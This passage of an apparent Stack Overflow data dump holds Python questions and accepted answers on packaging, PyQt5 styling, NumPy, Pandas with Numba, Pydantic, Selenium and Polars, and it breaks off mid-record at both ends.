this:\n[project]\nname = \"coolproject\"\ndependencies = [\n   'pyyaml==5.3',\n   'anytree==2.8.0',\n   'pytest'\n]\ndynamic = [\n   \"version\"\n]\n\n[build-system]\nrequires = [\"setuptools\", \"wheel\", \"setuptools_scm[toml]>=6.2\"]\n\n[tool.setuptools_scm]\n\nAny ideas?\n",
    "AcceptedAnswerId": 73497494,
    "AcceptedAnswer": "Turning @AKX's comments into an answer so that other people can find it more easily.\nThe problem may be an outdated pip/setuptools on the system. Apparently, version 19.3.1 which I have on my system  cannot install a version of setuptools that can handle PEP621 metadata correctly.\nYou cannot require a new pip from within pyproject.toml using the build-system.requires directive.\nIn case you cannot update the system pip, you can always install on a per-user basis:\npip install --user pip\n\nand you're good to go.\n"
}
{
    "Id": 73013333,
    "PostTypeId": 1,
    "Title": "How to make an Angled arrow style border in PyQt5?",
    "Body": "How to make an Angled arrow-type border in PyQt QFrame? In My code, I Have two QLabels and respective frames. My aim is to make an arrow shape border on right side of every QFrame.For clear-cut idea, attach a sample picture.\nimport sys\nfrom PyQt5.QtWidgets import *\n\nclass Angle_Border(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"Angle Border\")\n\n        self.lbl1 = QLabel(\"Python\")\n        self.lbl2 = QLabel(\"PyQt\")\n\n        self.frame1 = QFrame()\n        self.frame1.setProperty(\"type\",\"1\")\n        self.frame1.setFixedSize(200,50)\n        self.frame1.setStyleSheet(\"background-color:red;color:white;\"\n                                  \"font-family:Trebuchet MS;font-size: 15pt;text-align: center;\"\n                                  \"border-top-right-radius:25px solid ; border-bottom-right-radius:25px solid ;\")\n        self.frame2 = QFrame()\n        self.frame2.setFixedSize(200, 50)\n        self.frame2.setStyleSheet(\"background-color:blue;color:white;\"\n                                  \"font-family:Trebuchet MS;font-size: 15pt;text-align: center;\"\n                                  \"border-top:1px solid transparent; border-bottom:1px solid  transparent;\")\n        self.frame_outer = QFrame()\n        self.frame_outer.setFixedSize(800, 60)\n        self.frame_outer.setStyleSheet(\"background-color:green;color:white;\"\n                                  \"font-family:Trebuchet MS;font-size: 15pt;text-align: center;\")\n\n        self.frame1_layout = QHBoxLayout(self.frame1)\n        self.frame2_layout = QHBoxLayout(self.frame2)\n        self.frame_outer_layout = QHBoxLayout(self.frame_outer)\n        self.frame_outer_layout.setContentsMargins(5,0,0,0)\n\n        self.frame1_layout.addWidget(self.lbl1)\n        self.frame2_layout.addWidget(self.lbl2)\n\n        self.hbox = QHBoxLayout()\n        self.layout = QHBoxLayout()\n        self.hbox.addWidget(self.frame1)\n        self.hbox.addWidget(self.frame2)\n        self.hbox.addStretch()\n        self.hbox.setSpacing(0)\n        # self.layout.addLayout(self.hbox)\n        self.frame_outer_layout.addLayout(self.hbox)\n        self.layout.addWidget(self.frame_outer)\n\n        self.setLayout(self.layout)\n\ndef main():\n    app = QApplication(sys.argv)\n    ex = Angle_Border()\n    ex.show()\n    sys.exit(app.exec_())\n\nif __name__ == '__main__':\n    main()\n\nSample Picture\n\n",
    "AcceptedAnswerId": 73104110,
    "AcceptedAnswer": "Since the OP didn't ask for user interaction (mouse or keyboard), a possible solution could use the existing features of Qt, specifically QSS (Qt Style Sheets).\nWhile the currently previously accepted solution does follow that approach, it's not very effective, most importantly because it's basically \"static\", since it always requires knowing the color of the following item in order to define the \"arrow\" colors.\nThis not only forces the programmer to always consider the \"sibling\" items, but also makes extremely (and unnecessarily) complex the dynamic creation of such objects.\nThe solution is to always (partially) \"redo\" the layout and update the stylesheets with the necessary values, which consider the current size (which shouldn't be hardcoded), the following item (if any) and carefully using the layout properties and \"spacer\" stylesheets based on the contents.\nThe following code uses a more abstract, dynamic approach, with basic functions that allow adding/insertion and removal of items. It still uses a similar QSS method, but, with almost the same \"line count\", it provides a simpler and much more intuitive approach, allowing item creation, deletion and modification with single function calls that are much easier to use.\nA further benefit of this approach is that implementing \"reverse\" arrows is quite easy, and doesn't break the logic of the item creation.\nConsidering all the above, you can create an actual class that just needs basic calls such as addItem() or removeItem().\nfrom PyQt5.QtCore import *\nfrom PyQt5.QtGui import *\nfrom PyQt5.QtWidgets import *\n\nclass ArrowMenu(QWidget):\n    vMargin = -1\n    hMargin = -1\n    def __init__(self, items=None, parent=None):\n        super().__init__(parent)\n        layout = QHBoxLayout(self)\n        layout.setContentsMargins(0, 0, 0, 0)\n        layout.setSpacing(0)\n        layout.addStretch()\n        self.items = []\n        if isinstance(items, dict):\n            self.addItems(items.items())\n        elif items is not None:\n            self.addItems(items)\n\n    def addItems(self, items):\n        for item in items:\n            if isinstance(item, str):\n                self.addItem(item)\n            else:\n                self.addItem(*item)\n\n    def addItem(self, text, background=None):\n        self.insertItem(len(self.items), text, background)\n\n    def insertItem(self, index, text, background=None):\n        label = QLabel(text)\n        if background is None:\n            background = self.palette().window().color()\n            background.setAlpha(0)\n        else:\n            background = QColor(background)\n\n        # human eyes perceive \"brightness\" in different ways, let's compute\n        # that value in order to decide a color that has sufficient contrast\n        # with the background; see https://photo.stackexchange.com/q/10412\n        r, g, b, a = background.getRgbF()\n        brightness = r * .3 + g * .59 + b * .11\n        foreground = 'black' if brightness >= .5 else 'white'\n\n        label.setStyleSheet('color: {}; background: {};'.format(\n            foreground, background.name(background.HexArgb)))\n\n        layout = self.layout()\n        if index < len(self.items):\n            i = 0\n            for _label, _spacer, _ in self.items:\n                if i == index:\n                    i += 1\n                layout.insertWidget(i * 2, _label)\n                layout.insertWidget(i * 2 + 1, _spacer)\n                i += 1\n\n        layout.insertWidget(index * 2, label)\n        spacer = QWidget(objectName='menuArrow')\n        layout.insertWidget(index * 2 + 1, spacer)\n        self.items.insert(index, (label, spacer, background))\n        self.updateItems()\n\n    def removeItem(self, index):\n        label, spacer, background = self.items.pop(index)\n        label.deleteLater()\n        spacer.deleteLater()\n        layout = self.layout()\n        for i, (label, spacer, _) in enumerate(self.items):\n            layout.insertWidget(i * 2, label)\n            layout.insertWidget(i * 2 + 1, spacer)\n        self.updateItems()\n        self.updateGeometry()\n\n    def updateItems(self):\n        if not self.items:\n            return\n\n        size = self.fontMetrics().height()\n        if self.vMargin < 0:\n            vSize = size * 2\n        else:\n            vSize = size + self.vMargin * 2\n        spacing = vSize / 2\n        self.setMinimumHeight(vSize)\n        if self.hMargin >= 0:\n            labelMargin = self.hMargin * 2\n        else:\n            labelMargin = size // 2\n\n        it = iter(self.items)\n        prevBackground = prevSpacer = None\n        while True:\n            try:\n                label, spacer, background = next(it)\n                label.setContentsMargins(labelMargin, 0, labelMargin, 0)\n                spacer.setFixedWidth(spacing)\n\n            except StopIteration:\n                background = QColor()\n                break\n\n            finally:\n                if prevBackground:\n                    if background.isValid():\n                        cssBackground = background.name(QColor.HexArgb)\n                    else:\n                        cssBackground = 'none'\n                    if prevBackground.alpha():\n                        prevBackground = prevBackground.name(QColor.HexArgb)\n                    else:\n                        mid = QColor(prevBackground)\n                        mid.setAlphaF(.5)\n                        prevBackground = '''\n                            qlineargradient(x1:0, y1:0, x2:1, y2:0,\n                            stop:0 {}, stop:1 {})\n                        '''.format(\n                            prevBackground.name(QColor.HexArgb), \n                            mid.name(QColor.HexArgb), \n                            )\n                    prevSpacer.setStyleSheet('''\n                        ArrowMenu > .QWidget#menuArrow {{\n                            background: transparent;\n                            border-top: {size}px solid {background};\n                            border-bottom: {size}px solid {background};\n                            border-left: {spacing}px solid {prevBackground};\n                        }}\n                    '''.format(\n                            size=self.height() // 2, \n                            spacing=spacing, \n                            prevBackground=prevBackground, \n                            background=cssBackground\n                    ))\n\n                prevBackground = background\n                prevSpacer = spacer\n\n    def resizeEvent(self, event):\n        self.updateItems()\n\n\nif __name__ == '__main__':\n    import sys\n    app = QApplication(sys.argv)\n    items = (\n            ('Python', 'green'), \n            ('Will delete', 'chocolate'), \n            ('PyQt5', 'red'), \n            ('Java', 'blue'), \n            ('ASP.Net', 'yellow'), \n        )\n    ex = ArrowMenu(items)\n    ex.show()\n    QTimer.singleShot(2000, lambda: ex.addItem('New item', 'aqua'))\n    QTimer.singleShot(5000, lambda: ex.removeItem(1))\n    sys.exit(app.exec_())\n\nAnd here is the result:\n\n"
}
{
    "Id": 72604922,
    "PostTypeId": 1,
    "Title": "How to convert Python dataclass to dictionary of string literal?",
    "Body": "Given a dataclass like below:\nclass MessageHeader(BaseModel):\n    message_id: uuid.UUID\n\n    def dict(self, **kwargs):\n        return json.loads(self.json())\n\nI would like to get a dictionary of string literal when I call dict on MessageHeader\nThe desired outcome of dictionary is like below:\n{'message_id': '383b0bfc-743e-4738-8361-27e6a0753b5a'}\n\nI want to avoid using 3rd party library like pydantic & I do not want to use json.loads(self.json()) as there are extra round trips\nIs there any better way to convert a dataclass to a dictionary with string literal like above?\n",
    "AcceptedAnswerId": 72605423,
    "AcceptedAnswer": "You can use dataclasses.asdict:\nfrom dataclasses import dataclass, asdict\n\nclass MessageHeader(BaseModel):\n    message_id: uuid.UUID\n\n    def dict(self):\n        return {k: str(v) for k, v in asdict(self).items()}\n\nIf you're sure that your class only has string values, you can skip the dictionary comprehension entirely:\nclass MessageHeader(BaseModel):\n    message_id: uuid.UUID\n\n    dict = asdict\n\n"
}
{
    "Id": 73548604,
    "PostTypeId": 1,
    "Title": "Create 2D Matrix of ascending integers in diagonal/triangle-like order with Numpy",
    "Body": "How do I create a matrix of ascending integers that are arrayed like this example of N=6?\n1  3  6\n2  5  0 \n4  0  0\n\nHere another example for N=13:\n1  3  6  10 0\n2  5  9  13 0\n4  8  12 0  0\n7  11 0  0  0\n10 0  0  0  0\n\nAlso, the solution should perform well for large N values.\nMy code\nimport numpy as np\nN = 13\narray_dimension = 5\nx = 0\ny = 1\nz = np.zeros((array_dimension,array_dimension))\nz[0][0] = 1\nfor i in range(2, N+1):\n    z[y][x] = i\n    if y == 0:\n        y = (x + 1)\n        x = 0\n    else:\n        x += 1\n        y -= 1\nprint(z)\n\n[[ 1.  3.  6. 10.  0.]\n [ 2.  5.  9.  0.  0.]\n [ 4.  8. 13.  0.  0.]\n [ 7. 12.  0.  0.  0.]\n [11.  0.  0.  0.  0.]]\n\nworks, but there must be a more efficient way. Most likely via Numpy, but I cannot find a solution.\n",
    "AcceptedAnswerId": 73555372,
    "AcceptedAnswer": "The assignment can be completed in one step by simply transforming the index of the lower triangle:\ndef fill_diagonal(n):\n    assert n > 0\n    m = int((2 * n - 1.75) ** 0.5 + 0.5)\n    '''n >= ((1 + (m - 1)) * (m - 1)) / 2 + 1\n    => 2n - 2 >= m ** 2 - m\n    => 2n - 7 / 4 >= (m - 1 / 2) ** 2\n    => (2n - 7 / 4) ** (1 / 2) + 1 / 2 >= m for n > 0\n    => m = floor((2n - 7 / 4) ** (1 / 2) + 1 / 2)\n    or n <= ((1 + m) * m) / 2\n    => (2n + 1 / 4) ** (1 / 2) - 1 / 2  0\n    => m = ceil((2n + 1 / 4) ** (1 / 2) - 1 / 2)\n    '''\n    i, j = np.tril_indices(m)\n    i -= j\n    ret = np.zeros((m, m), int)\n    ret[i[:n], j[:n]] = np.arange(1, n + 1)\n    return ret\n\nTest:\n>>> for i in range(1, 16):\n...     print(repr(fill_diagonal(i)), end='\\n\\n')\n...\narray([[1]])\n\narray([[1, 0],\n       [2, 0]])\n\narray([[1, 3],\n       [2, 0]])\n\narray([[1, 3, 0],\n       [2, 0, 0],\n       [4, 0, 0]])\n\narray([[1, 3, 0],\n       [2, 5, 0],\n       [4, 0, 0]])\n\narray([[1, 3, 6],\n       [2, 5, 0],\n       [4, 0, 0]])\n\narray([[1, 3, 6, 0],\n       [2, 5, 0, 0],\n       [4, 0, 0, 0],\n       [7, 0, 0, 0]])\n\narray([[1, 3, 6, 0],\n       [2, 5, 0, 0],\n       [4, 8, 0, 0],\n       [7, 0, 0, 0]])\n\narray([[1, 3, 6, 0],\n       [2, 5, 9, 0],\n       [4, 8, 0, 0],\n       [7, 0, 0, 0]])\n\narray([[ 1,  3,  6, 10],\n       [ 2,  5,  9,  0],\n       [ 4,  8,  0,  0],\n       [ 7,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10,  0],\n       [ 2,  5,  9,  0,  0],\n       [ 4,  8,  0,  0,  0],\n       [ 7,  0,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10,  0],\n       [ 2,  5,  9,  0,  0],\n       [ 4,  8,  0,  0,  0],\n       [ 7, 12,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10,  0],\n       [ 2,  5,  9,  0,  0],\n       [ 4,  8, 13,  0,  0],\n       [ 7, 12,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10,  0],\n       [ 2,  5,  9, 14,  0],\n       [ 4,  8, 13,  0,  0],\n       [ 7, 12,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\narray([[ 1,  3,  6, 10, 15],\n       [ 2,  5,  9, 14,  0],\n       [ 4,  8, 13,  0,  0],\n       [ 7, 12,  0,  0,  0],\n       [11,  0,  0,  0,  0]])\n\nFor the case of large n, the performance is about 10 to 20 times that of the loop solution:\n%timeit fill_diagonal(10 ** 5)\n1.63 ms \u00b1 94.5 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 1,000 loops each)\n%timeit fill_diagonal_loop(10 ** 5)    # OP's solution\n25.1 ms \u00b1 218 \u00b5s per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\n"
}
{
    "Id": 73561079,
    "PostTypeId": 1,
    "Title": "Yet another combinations with conditions question",
    "Body": "I want to efficiently generate pairs of elements from two lists equal to their Cartesian product with some elements omitted. The elements in each list are unique.\nThe code below does exactly what's needed but I'm looking to optimize it perhaps by replacing the loop.\nSee the comments in the code for details.\nAny advice would be appreciated.\nfrom itertools import product\nfrom pprint import pprint as pp\n\ndef pairs(list1, list2):\n    \"\"\" Return all combinations (x,y) from list1 and list2 except:\n          1. Omit combinations (x,y) where x==y \"\"\"\n    tuples = filter(lambda t: t[0] != t[1], product(list1,list2))\n\n    \"\"\"   2. Include only one of the combinations (x,y) and (y,x) \"\"\"\n    result = []\n    for t in tuples:\n        if not (t[1], t[0]) in result:\n            result.append(t)\n    return result\n\nlist1 = ['A', 'B', 'C']\nlist2 = ['A', 'D', 'E']\npp(pairs(list1, list1))  #  Test a list with itself\npp(pairs(list1, list2))  #  Test two lists with some common elements\n\nOutput\n[('A', 'B'), ('A', 'C'), ('B', 'C')]\n[('A', 'D'),\n ('A', 'E'),\n ('B', 'A'),\n ('B', 'D'),\n ('B', 'E'),\n ('C', 'A'),\n ('C', 'D'),\n ('C', 'E')]\n\n",
    "AcceptedAnswerId": 73575445,
    "AcceptedAnswer": "About 5-6 times faster than the fastest in your answer's benchmark. I build sets of values that appear in both lists or just one, and combine them appropriately without further filtering.\nfrom itertools import product, combinations\n\ndef pairs(list1, list2):\n    a = {*list1}\n    b = {*list2}\n    ab = a & b\n    return [\n        *product(a, b-a),\n        *product(a-b, ab),\n        *combinations(ab, 2)\n    ]\n\nYou could also make it an iterator (because unlike previous solutions, I don't need to store the already produced pairs to filter further ones):\nfrom itertools import product, combinations, chain\n\ndef pairs(list1, list2):\n    a = {*list1}\n    b = {*list2}\n    ab = a & b\n    return chain(\n        product(a, b-a),\n        product(a-b, ab),\n        combinations(ab, 2)\n    )\n\n"
}
{
    "Id": 73137036,
    "PostTypeId": 1,
    "Title": "\"Expected type\" warning from changing dictionary value from None type to str type within a function (Pycharm IDE)",
    "Body": "I have a dictionary for which the key \"name\" is initialized to None (as this be easily used in if name: blocks) if a name is read in it is then assigned to name.\nAll of this works fine but Pycharm throws a warning when \"name\" is changed due to the change in type. While this isn't the end of the world it's a pain for debugging (and could be a pain for maintaining the code). Does anyone know if there is a way either to provide something akin to a type hint to the dictionary or failing that to tell Pycharm the change of type is intended?\ncode replicating issue:\nfrom copy import deepcopy\n\ntest = {\n    \"name\": None,\n    \"other_variables\": \"Something\"\n}\n\n\ndef read_info():\n    test_2 = deepcopy(test)\n    test_2[\"name\"] = \"this is the name\"  # Pycharm shows warning\n    return test_2[\"name\"]\n\nideal solution:\nfrom copy import deepcopy\n\ntest = {\n    \"name\": None type=str,\n    \"other_variables\": \"Something\"\n}\n\n\ndef read_info():\n    test_2 = deepcopy(test)\n    test_2[\"name\"] = \"this is the name\"  # no warning\n    return test_2[\"name\"]\n\nNote:\nI know that setting the default value to \"\" would behave the same but a) it's handy having it print out \"None\" if name is printed before assignment and b) I find it slightly more readable to have None instead of \"\".\nNote_2:\nI am unaware why (it may be a bug or intended for some reason I don't understand) but Pycharm only gives a wanrning if the code shown above is found within a function. i.e. replacing the read_info() function with the lines:\ntest_2 = deepcopy(test)\ntest_2[\"name\"] = \"this is the name\"  # Pycharm shows warning\n\nDoes not give a warning\n",
    "AcceptedAnswerId": 73137424,
    "AcceptedAnswer": "Type hinting that dictionary with dict[str, None | str] (Python 3.10+, older versions need to use typing.Dict[str, typing.Optional[str]]) seems to fix this:\nfrom copy import deepcopy\n\ntest: dict[str, None | str] = {\n    \"name\": None,\n    \"other_variables\": \"Something\"\n}\n\n\ndef read_info():\n    test_2 = deepcopy(test)\n    test_2[\"name\"] = \"this is the name\"  # no warning\n    return test_2[\"name\"]\n\nAs noticed by @Tomerikoo simply type hinting as dict also works (this should work on all? Python versions that support type hints too):\ntest: dict = {\n    \"name\": None,\n    \"other_variables\": \"Something\"\n}\n\n"
}
{
    "Id": 72249268,
    "PostTypeId": 1,
    "Title": "Pandas drop rows lower then others in all colums",
    "Body": "I have a dataframe with a lot of rows with numerical columns, such as:\n\n\n\n\nA\nB\nC\nD\n\n\n\n\n12\n7\n1\n0\n\n\n7\n1\n2\n0\n\n\n1\n1\n1\n1\n\n\n2\n2\n0\n0\n\n\n\n\nI need to reduce the size of the dataframe by removing those rows that has another row with all values bigger.\nIn the previous example i need to remove the last row because the first row has all values bigger (in case of dubplicate rows i need to keep one of them).\nAnd return This:\n\n\n\n\nA\nB\nC\nD\n\n\n\n\n12\n7\n1\n0\n\n\n7\n1\n2\n0\n\n\n1\n1\n1\n1\n\n\n\n\nMy faster solution are the folowing:\n    def complete_reduction(df, columns):\n        def _single_reduction(row):\n            df[\"check\"] = True\n            for col in columns:\n                df[\"check\"] = df[\"check\"] & (df[col] >= row[col])\n            drop_index.append(df[\"check\"].sum() == 1)\n        df = df.drop_duplicates(subset=columns)\n        drop_index = []\n        df.apply(lambda x: _single_reduction(x), axis=1)\n        df = df[numpy.array(drop_index).astype(bool)]\n        return df\n\nAny better ideas?\n\nUpdate:\nA new solution has been found here\nhttps://stackoverflow.com/a/68528943/11327160\nbut i hope for somethings faster.\n",
    "AcceptedAnswerId": 72368866,
    "AcceptedAnswer": "An more memory-efficient and faster solution than the one proposed so far is to use Numba. There is no need to create huge temporary array with Numba. Moreover, it is easy to write a parallel implementation that makes use of all CPU cores. Here is the implementation:\nimport numba as nb\n\n@nb.njit\ndef is_dominated(arr, k):\n    n, m = arr.shape\n    for i in range(n):\n        if i != k:\n            dominated = True\n            for j in range(m):\n                if arr[i, j] < arr[k, j]:\n                    dominated = False\n            if dominated:\n                return True\n    return False\n\n# Precompile the function to native code for the most common types\n@nb.njit(['(i4[:,::1],)', '(i8[:,::1],)'], parallel=True, cache=True)\ndef dominated_rows(arr):\n    n, m = arr.shape\n    toRemove = np.empty(n, dtype=np.bool_)\n    for i in nb.prange(n):\n        toRemove[i] = is_dominated(arr, i)\n    return toRemove\n\n# Special case\ndf2 = df.drop_duplicates()\n\n# Main computation\nresult = df2[~dominated_rows(np.ascontiguousarray(df.values))]\n\n\nBenchmark\nThe input test is two random dataframes of shape 20000x5 and 5000x100 containing small integers (ie. [0;100[). Tests have been done on a (6-core) i5-9600KF processor with 16 GiB of RAM on Windows. The version of @BingWang is the updated one of the 2022-05-24. Here are performance results of the proposed approaches so far:\nDataframe with shape 5000x100\n - Initial code:   114_340 ms\n - BENY:             2_716 ms  (consume few GiB of RAM)\n - Bing Wang:        2_619 ms\n - Numba:              303 ms  <----\n\nDataframe with shape 20000x5\n - Initial code:    (too long)\n - BENY:             8.775 ms  (consume few GiB of RAM)\n - Bing Wang:          578 ms\n - Numba:               21 ms  <----\n\nThis solution is respectively about 9 to 28 times faster than the fastest one (of @BingWang). It also has the benefit of consuming far less memory. Indeed, the @BENY implementation consume few GiB of RAM while this one (and the one of @BingWang) only consumes no more than few MiB for this used-case. The speed gain over the @BingWang implementation is due to the early stop, parallelism and the native execution.\nOne can see that this Numba implementation and the one of @BingWang are quite efficient when the number of column is small. This makes sense for the @BingWang since the complexity should be O(N(logN)^(d-2)) where d is the number of columns. As for Numba, it is significantly faster because most rows are dominated on the second random dataset causing the early stop to be very effective in practice. I think the @BingWang algorithm might be faster when most rows are not dominated. However, this case should be very uncommon on dataframes with few columns and a lot of rows (at least, clearly on uniformly random ones).\n"
}
{
    "Id": 72610552,
    "PostTypeId": 1,
    "Title": "\"Most Replayed\" Data of Youtube Video via API",
    "Body": "Is there any way to extract the \"Most Replayed\" (aka Video Activity Graph) Data from a Youtube video via API?\nWhat I'm referring to:\n\n",
    "AcceptedAnswerId": 72624653,
    "AcceptedAnswer": "One more time YouTube Data API v3 doesn't provide a basic feature.\nI recommend you to try out my open-source YouTube operational API. Indeed by fetching https://yt.lemnoslife.com/videos?part=mostReplayed&id=VIDEO_ID, you will get the most replayed graph values you are looking for in item[\"mostReplayed\"][\"heatMarkers\"][\"heatMarkerRenderer\"][\"heatMarkerIntensityScoreNormalized\"].\nWith the video id XiCrniLQGYc you would get:\n{\n    \"kind\": \"youtube#videoListResponse\",\n    \"etag\": \"NotImplemented\",\n    \"items\": [\n        {\n            \"kind\": \"youtube#video\",\n            \"etag\": \"NotImplemented\",\n            \"id\": \"XiCrniLQGYc\",\n            \"mostReplayed\": {\n                \"maxHeightDp\": 40,\n                \"minHeightDp\": 4,\n                \"showHideAnimationDurationMillis\": 200,\n                \"heatMarkers\": [\n                    {\n                        \"heatMarkerRenderer\": {\n                            \"timeRangeStartMillis\": 0,\n                            \"markerDurationMillis\": 2580,\n                            \"heatMarkerIntensityScoreNormalized\": 1\n                        }\n                    },\n                    ...\n                ],\n                \"heatMarkersDecorations\": [\n                    {\n                        \"timedMarkerDecorationRenderer\": {\n                            \"visibleTimeRangeStartMillis\": 0,\n                            \"visibleTimeRangeEndMillis\": 7740,\n                            \"decorationTimeMillis\": 2580,\n                            \"label\": {\n                                \"runs\": [\n                                    {\n                                        \"text\": \"Most replayed\"\n                                    }\n                                ]\n                            },\n                            \"icon\": \"AUTO_AWESOME\",\n                            \"trackingParams\": \"CC0Q38YIGGQiEwiFxcqD7-P9AhX8V08EHcIFCg8=\"\n                        }\n                    }\n                ]\n            }\n        }\n    ]\n}\n\n"
}
{
    "Id": 73155924,
    "PostTypeId": 1,
    "Title": "Inheritance/subclassing issue in Pydantic",
    "Body": "I came across a code snippet for declaring Pydantic Models. The inheritance used there has me confused.\nclass RecipeBase(BaseModel):\n  label: str\n  source: str\n  url: HttpUrl\n\n\nclass RecipeCreate(RecipeBase):\n  label: str\n  source: str\n  url: HttpUrl\n  submitter_id: int\n\n\nclass RecipeUpdate(RecipeBase):\n  label: str\n\nI am not sure what's the benefit of inheriting from RecipeBase in the RecipeCreate and RecipeUpdate class. The part that has me confused is that after inheritance also, why does one has to re-declare label, source, and URL, which are already part of the  RecipeBase class in the  RecipeCreate class?\n",
    "AcceptedAnswerId": 73159535,
    "AcceptedAnswer": "I\u2019d say it is an oversight from the tutorial. There is no benefit and only causes confusion. Typically, Base is used for all overlapping fields, and they are only overloaded when they change type (for example, XyzBase has name: str whereas XyzCreate has name: str|None because it doesn\u2019t has to be provided when updating an instance.\nThe tutorial is doing a bad job explaining why the setup is as it is.\n"
}
{
    "Id": 73199376,
    "PostTypeId": 1,
    "Title": "RequestsDependencyWarning: urllib3 (1.26.11) or chardet (3.0.4) doesn't match a supported version error using Selenium and ChromeDriverManager",
    "Body": "I have this script to acess my internet modem and reboot the device, but stop to work some weeks ago. Here my code:\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nfrom selenium.webdriver.chrome.service import Service\nfrom webdriver_manager.chrome import ChromeDriverManager\nservice = Service(executable_path=ChromeDriverManager().install())\ndriver = webdriver.Chrome(service=service)\nfrom selenium.webdriver.common.by import By\n\nchrome_options = Options()\nchrome_options.add_argument('--headless')\nchrome_options.add_argument('--no-sandbox')\nchrome_options.add_argument('--disable-dev-shm-usage')\n\ndriver = webdriver.Chrome(ChromeDriverManager().install(),options=chrome_options)\n\ndriver.get('http://192.168.15.1/me_configuracao_avancada.asp',)\nuser = driver.find_element(By.ID, \"txtUser\")\nuser.send_keys(\"support\")\nbtnLogin = driver.find_element(By.ID, \"btnLogin\")\nbtnLogin.click()\ndriver.get('http://192.168.15.1/reboot.asp',)\nreboot = driver.find_element(By.ID, \"btnReboot\")\nreboot.click()\nprint(\"Modem Reiniciado!\")\n\nnow when i run, this error messages return:\n/usr/lib/python3/dist-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.11) or chardet (3.0.4) doesn't match a supported version!\n  warnings.warn(\"urllib3 ({}) or chardet ({}) doesn't match a supported \"\nTraceback (most recent call last):\n  File \"modem.py\", line 7, in \n    driver = webdriver.Chrome(service=service)\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/chrome/webdriver.py\", line 69, in __init__\n    super().__init__(DesiredCapabilities.CHROME['browserName'], \"goog\",\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/chromium/webdriver.py\", line 92, in __init__\n    super().__init__(\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/webdriver.py\", line 277, in __init__\n    self.start_session(capabilities, browser_profile)\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/webdriver.py\", line 370, in start_session\n    response = self.execute(Command.NEW_SESSION, parameters)\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/webdriver.py\", line 435, in execute\n    self.error_handler.check_response(response)\n  File \"/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/errorhandler.py\", line 247, in check_response\n    raise exception_class(message, screen, stacktrace)\nselenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormally.\n  (unknown error: DevToolsActivePort file doesn't exist)\n  (The process started from chrome location /usr/bin/google-chrome is no longer running, so ChromeDriver is assuming that Chrome has crashed.)\nStacktrace:\n#0 0x561e346d9cd3 \n#1 0x561e344e1968 \n#2 0x561e3450625c \n#3 0x561e345018fa \n#4 0x561e3453c94a \n#5 0x561e34536aa3 \n#6 0x561e3450c3fa \n#7 0x561e3450d555 \n#8 0x561e347212bd \n#9 0x561e34725418 \n#10 0x561e3470b36e \n#11 0x561e34726078 \n#12 0x561e346ffbb0 \n#13 0x561e34742d58 \n#14 0x561e34742ed8 \n#15 0x561e3475ccfd \n#16 0x7fc22f8b9609 \n\nSome weeks ago this code run without any problems, but now i'm stuck\nI'm using Google Chrome 103.0.5060.134 and ChromeDriver 103.0.5060.134.\n",
    "AcceptedAnswerId": 73199422,
    "AcceptedAnswer": "This error message...\n/usr/lib/python3/dist-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.11) or chardet (3.0.4) doesn't match a supported version!\n  warnings.warn(\"urllib3 ({}) or chardet ({}) doesn't match a supported \"\n\n...implies that the requests module is backdated hence not in sync and needs an update.\n\nSolution\nYou can update the requests module using either of the following commands:\npip3 install requests\n\nor\npip3 install --upgrade requests\n\n"
}
{
    "Id": 70552618,
    "PostTypeId": 1,
    "Title": "VScode fails to export Jupyter notebook to HTML - 'jupyter-nbconvert` not found",
    "Body": "I keep on getting error message:\nAvailable subcommands: 1.0.0\nJupyter command `jupyter-nbconvert` not found.\n\nI've tried to reinstall nbconvert using pip to no use. I've also tried the tip from this thread with installing pip install jupyter in vscode terminal but it shows that \"Requirement already satisfied\"\nVSCode fails to export jupyter notebook to html\nI've also tried to manually edit jupyter settings.json file to the following:\n\"python.pythonPath\": \"C:\\\\Users\\\\XYZ\\\\AppData\\\\Local\\\\Packages\\\\PythonSoftwareFoundation.Python.3.9_qbz5n2kfra8p0\\\\LocalCache\\\\local-packages\\\\Python39\\\\Scripts\"\n\nI've python 3.9 installed via windows store.\nAny tip on what might be the issue for vscode doesn't want to export the notebook?\n",
    "AcceptedAnswerId": 72369322,
    "AcceptedAnswer": "Unsure exactly what fixed the issue but heres a summary.\n\nUpdated to python 3.10\nInstalled pandoc and miktex\nPowershell reinstall nbconvert\n\n\nReceived warning that nbconvert script file is installed in a location not in Path.\nCopied said location to System Properties - Envionment Variables - Path\n\n\nRestart and install all miktex package on the go\n\nPDF export and HTML export seems to work as intended now.\n"
}
{
    "Id": 73203318,
    "PostTypeId": 1,
    "Title": "How to transform Spark dataframe to Polars dataframe?",
    "Body": "I wonder how i can transform Spark dataframe to Polars dataframe.\nLet's say i have this code on PySpark:\ndf = spark.sql('''select * from tmp''')\n\nI can easily transform it to pandas dataframe using .toPandas.\nIs there something similar in polars, as I need to get a polars dataframe for further processing?\n",
    "AcceptedAnswerId": 73205690,
